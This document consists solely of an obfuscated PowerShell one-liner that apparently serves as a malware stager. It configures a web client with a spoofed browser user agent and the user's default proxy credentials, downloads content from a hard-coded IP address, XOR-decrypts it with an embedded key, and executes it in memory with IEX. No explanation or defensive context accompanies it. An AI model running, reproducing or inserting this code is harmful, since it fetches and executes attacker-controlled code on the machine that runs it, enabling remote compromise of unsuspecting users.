
$Wc=New-OBJect SYstEm.NeT.WeBCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAders.ADD('User-Agent',$u);$wc.ProxY = [SySTeM.NET.WEBReqUest]::DEFaUltWEBPrOXy;$WC.ProXy.CrEdeNTiALS = [SysTEM.NET.CREdEnTiAlCAChE]::DeFauLtNeTwORKCrEDentialS;$K='acdbc174f599e7dbd03a21fa24b5dbf6';$I=0;[ChAr[]]$B=([chAr[]]($WC.DOWnlOaDSTrInG("http://78.229.133.134:80/index.asp")))|%{$_-bXor$K[$i++%$K.LeNgTh]};IEX ($b-jOIN'')

